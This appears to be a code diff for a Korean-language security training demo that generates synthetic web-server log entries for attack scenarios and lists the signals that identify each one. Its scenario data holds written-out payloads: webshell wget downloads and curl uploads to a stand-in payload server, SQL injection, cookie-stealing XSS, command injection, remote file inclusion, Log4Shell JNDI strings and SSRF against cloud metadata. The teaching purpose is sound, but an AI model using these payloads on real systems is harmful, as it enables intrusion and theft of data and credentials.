@@ -65,24 +65,28 @@ SCENARIOS = {
  "webshell": dict(
     label="① 웹셸 명령 실행", stage="실행",
     ip=ATTACKER, ua=UA_ATTACK, rule="100101", color="suspect",
+    entry="통합 검색창(취약한 search.php) — 검색어가 서버 명령으로 실행됨",
     req=[("GET", "/search.php?cmd=id", 200, 120)],
     detail="웹셸을 통한 원격 명령 실행(cmd=id)",
     expect="rule.id 100101 · 웹셸 명령 실행 시도"),
  "download": dict(
     label="② 페이로드 다운로드", stage="다운로드",
     ip=ATTACKER, ua=UA_ATTACK, rule="100101", color="suspect",
+    entry="이미 심어진 웹셸(search.php)의 cmd= 파라미터",
     req=[("GET", f"/search.php?cmd=wget+http://{PAYLOAD_SRV}/kworker+-O+/tmp/.cache/kworker", 200, 90)],
     detail="웹셸로 악성 파일 다운로드(cmd=wget)",
     expect="rule.id 100101 · 악성 페이로드 다운로드"),
  "exfil": dict(
     label="③ 정보 유출", stage="유출",
     ip=ATTACKER, ua=UA_ATTACK, rule="100101", color="suspect",
+    entry="웹셸(search.php)의 cmd= 파라미터",
     req=[("GET", f"/search.php?cmd=curl+-T+/tmp/loot.tgz+http://{PAYLOAD_SRV}/up", 200, 80)],
     detail="압축 파일 외부 업로드(cmd=curl -T)",
     expect="rule.id 100101 · 외부로 데이터 유출"),
  "scanner": dict(
     label="웹 취약점 스캐너", stage="정찰",
     ip=ATTACKER, ua=UA_SQLMAP, rule="100102", color="warn",
+    entry="사이트 전역 — 자동화 도구가 존재하지 않는 URL을 무작위로 훑음",
     req=[("GET", "/index.php?id=1+AND+1=1", 404, 330), ("GET", "/admin.php", 404, 300),
          ("GET", "/.env", 404, 280), ("GET", "/phpmyadmin/", 404, 300),
          ("GET", "/wp-login.php", 404, 290)],
@@ -91,17 +95,71 @@ SCENARIOS = {
  "flood": dict(
     label="로그인 반복 시도", stage="무차별",
     ip=ATTACKER, ua=UA_ATTACK, rule="5710 계열", color="warn",
+    entry="로그인 폼 — 같은 IP가 짧은 간격으로 반복 로그인 시도",
     req=[("GET", f"/portal/login?try={i}", 401, 210) for i in range(15)],
     detail="짧은 간격 로그인 반복(15건)",
     expect="반복 인증 실패 패턴"),
  "traversal": dict(
     label="디렉터리 트래버설", stage="정찰·접근",
-    ip=ATTACKER, ua=UA_ATTACK, rule="웹 공격 계열", color="warn",
+    ip=ATTACKER, ua=UA_ATTACK, rule="웹 공격(Path Traversal)", color="warn",
+    entry="문서함 '파일 다운로드' 링크의 file= 파라미터",
     req=[("GET", "/download?file=../../../../etc/passwd", 403, 210),
          ("GET", "/download?file=..%2f..%2f..%2f..%2fetc%2fpasswd", 403, 210),
          ("GET", "/static/../../../etc/shadow", 403, 190)],
     detail="경로 조작(../)으로 시스템 파일 접근 시도",
-    expect="웹 공격 룰(디렉터리 트래버설) 계열 · full_log에서 ../ 패턴으로 탐색"),
+    expect="식별 신호: 경로에 ../ 또는 인코딩된 ..%2f, /etc/passwd·/etc/shadow"),
+ # ---- 다양한 웹 공격 유형 (로그로 식별하는 법 학습) ---------------------------- #
+ "sqli": dict(
+    label="SQL 인젝션", stage="웹 공격",
+    ip=ATTACKER, ua=UA_ATTACK, rule="웹 공격(SQLi)", color="warn",
+    entry="로그인 폼의 아이디 입력란 · 상품 조회 페이지의 id= 파라미터",
+    req=[("GET", "/product?id=1'+OR+'1'='1", 200, 512),
+         ("GET", "/product?id=1+UNION+SELECT+username,password+FROM+users--", 200, 660),
+         ("GET", "/login?user=admin'--+-", 200, 320)],
+    detail="파라미터에 SQL 구문 주입(' OR '1'='1 · UNION SELECT)",
+    expect="식별 신호: 값에 따옴표('), UNION SELECT, 주석(--), OR 1=1, ; 등 SQL 키워드"),
+ "xss": dict(
+    label="XSS (반사형)", stage="웹 공격",
+    ip=ATTACKER, ua=UA_ATTACK, rule="웹 공격(XSS)", color="warn",
+    entry="통합 검색창 · 프로필 이름 입력란 (게시판 댓글은 '저장형' XSS)",
+    req=[("GET", "/search?q=<script>alert(document.cookie)</script>", 200, 420),
+         ("GET", "/profile?name=<img+src=x+onerror=alert(1)>", 200, 400)],
+    detail="URL 파라미터에 스크립트 주입(반사형 XSS)",
+    expect="식별 신호: 파라미터에 <script>, onerror=, onload=, javascript:, <img/<svg"),
+ "cmdi": dict(
+    label="OS 명령어 주입", stage="웹 공격",
+    ip=ATTACKER, ua=UA_ATTACK, rule="웹 공격(Command Injection)", color="warn",
+    entry="헬프데스크 '네트워크 진단' 도구의 host·domain 입력란",
+    req=[("GET", "/ping?host=127.0.0.1;id", 200, 300),
+         ("GET", "/tools?cmd=cat+/etc/passwd", 200, 340),
+         ("GET", "/dns?domain=a.com|whoami", 200, 300)],
+    detail="파라미터에 OS 명령을 연결(; | && `)",
+    expect="식별 신호: 값에 셸 구분자(; | && `), /etc/passwd, id·whoami·cat 같은 명령"),
+ "lfi": dict(
+    label="파일 인클루전(LFI)", stage="웹 공격",
+    ip=ATTACKER, ua=UA_ATTACK, rule="웹 공격(LFI/RFI)", color="warn",
+    entry="문서·페이지 뷰어의 page=·file= 파라미터",
+    req=[("GET", "/index.php?page=/etc/passwd", 200, 520),
+         ("GET", "/view?file=php://filter/convert.base64-encode/resource=config.php", 200, 500),
+         ("GET", "/inc?tpl=http://198.51.100.47/shell.txt", 200, 340)],
+    detail="include 파라미터로 시스템 파일·원격 소스 로드 시도",
+    expect="식별 신호: page=/file=/tpl= 값에 /etc/passwd, php://filter, http:// (원격 포함)"),
+ "log4shell": dict(
+    label="Log4Shell (JNDI)", stage="웹 공격",
+    ip=ATTACKER, ua=UA_ATTACK, rule="웹 공격(Log4Shell)", color="suspect",
+    entry="로그로 남는 모든 입력 — 검색어·User-Agent 헤더·API 파라미터",
+    req=[("GET", "/api/status?debug=${jndi:ldap://203.0.113.66:1389/a}", 200, 220),
+         ("GET", "/api/user?x=${jndi:dns://203.0.113.66/b}", 200, 210)],
+    detail="파라미터·헤더에 JNDI 룩업 주입(Log4Shell, CVE-2021-44228)",
+    expect="식별 신호: 요청 어디든 ${jndi:ldap://…} · ${jndi:dns:…} · ${jndi:rmi:…}"),
+ "ssrf": dict(
+    label="SSRF", stage="웹 공격",
+    ip=ATTACKER, ua=UA_ATTACK, rule="웹 공격(SSRF)", color="warn",
+    entry="URL 미리보기·이미지 가져오기 기능의 url=·target= 입력란",
+    req=[("GET", "/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/", 200, 300),
+         ("GET", "/proxy?target=http://127.0.0.1:6379/", 200, 260)],
+    detail="서버가 내부·클라우드 메타데이터로 요청하게 유도(SSRF)",
+    expect="식별 신호: url=/target= 값에 169.254.169.254(메타데이터), 127.0.0.1·localhost·내부 IP"),
 }
 
 # ---- static ---------------------------------------------------------------- #
@@ -136,7 +194,7 @@ def demo_act(name):
     append_lines(lines)
     m0, p0 = sc["req"][0][0], sc["req"][0][1]
     return jsonify(detail=sc["detail"], added=len(lines), lines=lines,
-                   rule=sc["rule"], ip=sc["ip"], expect=sc["expect"],
+                   rule=sc["rule"], ip=sc["ip"], expect=sc["expect"], entry=sc.get("entry", ""),
                    ua=sc["ua"], anat=anat_of(m0, p0, sc["ip"]))
 
 # --- interactive attack surfaces: search box (RCE-ish) + board (stored XSS) --- #
